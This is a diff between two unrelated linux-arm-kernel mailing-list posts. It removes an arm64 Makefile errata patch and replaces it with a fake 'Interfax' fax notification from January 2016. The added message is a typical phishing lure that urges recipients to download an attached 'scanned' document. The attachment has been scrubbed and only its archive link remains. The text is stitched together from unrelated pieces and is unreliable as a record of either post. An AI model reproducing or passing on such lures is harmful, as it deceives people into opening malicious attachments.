@@ -1,43 +1,28 @@
-From: dann.frazier@canonical.com (dann frazier)
-Date: Mon, 25 Jan 2016 16:52:16 -0700
-Subject: [PATCH v2] arm64: errata: Add -mpc-relative-literal-loads to build
- flags
-Message-ID: <20160125235216.GA10738@fluid.dannf>
+From: incoming@interfax.net (Interfax)
+Date: Tue, 26 Jan 2016 00:08:11 +0000
+Subject: You have received fax, document 000243631
+Message-ID: <9d62e5ce8779e969643f56604545b0f1@interfax.net>
 To: linux-arm-kernel@lists.infradead.org
 List-Id: linux-arm-kernel.lists.infradead.org
 
-GCC6 (and Linaro's 2015.12 snapshot of GCC5) has a new default that uses
-adrp/ldr or adrp/add to address literal pools. When CONFIG_ARM64_ERRATUM_843419
-is enabled, modules built with this toolchain fail to load:
+You have received a new fax.
 
-  [ 2.156817] module libahci: unsupported RELA relocation: 275
+Please, download fax document attached to this email.
 
-Longterm, this will likely be superseded by -mfix-cortex-a53-843419, which
-should disable this optimization in the future.
+Filename:            scanned-000243631.doc
+Scanned in:          23 seconds
+Pages:               10
+Scanned at:          Mon, 25 Jan 2016 07:46:02 +0300
+Author:              Claude Randolph
+Resolution:          300 DPI
+Filesize:            154 Kb
 
-v2: Unconditionally use flag for both kernel and modules, as Ard notes we have
-no requirement for supporting literals >1 MB away.
+Thanks for choosing Interfax!
 
-Cc: stable at vger.kernel.org
-Fixes: df057cc7b4fa ("arm64: errata: add module build workaround for erratum #843419")
-BugLink: http://bugs.launchpad.net/bugs/1533009
-Suggested-by: Christophe Lyon <christophe.lyon@linaro.org>
-Signed-off-by: dann frazier <dann.frazier@canonical.com>
----
- arch/arm64/Makefile | 1 +
- 1 file changed, 1 insertion(+)
-
-diff --git a/arch/arm64/Makefile b/arch/arm64/Makefile
-index cd822d8..b6c90e5 100644
---- a/arch/arm64/Makefile
-+++ b/arch/arm64/Makefile
-@@ -27,6 +27,7 @@ $(warning LSE atomics not supported by binutils)
- endif
- 
- KBUILD_CFLAGS	+= -mgeneral-regs-only $(lseinstr)
-+KBUILD_CFLAGS	+= $(call cc-option, -mpc-relative-literal-loads)
- KBUILD_AFLAGS	+= $(lseinstr)
- 
- ifeq ($(CONFIG_CPU_BIG_ENDIAN), y)
--- 
-2.7.0
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: scanned-000243631.zip
+Type: application/zip
+Size: 1540 bytes
+Desc: not available
+URL: <http://lists.infradead.org/pipermail/linux-arm-kernel/attachments/20160126/863e9b78/attachment.zip>
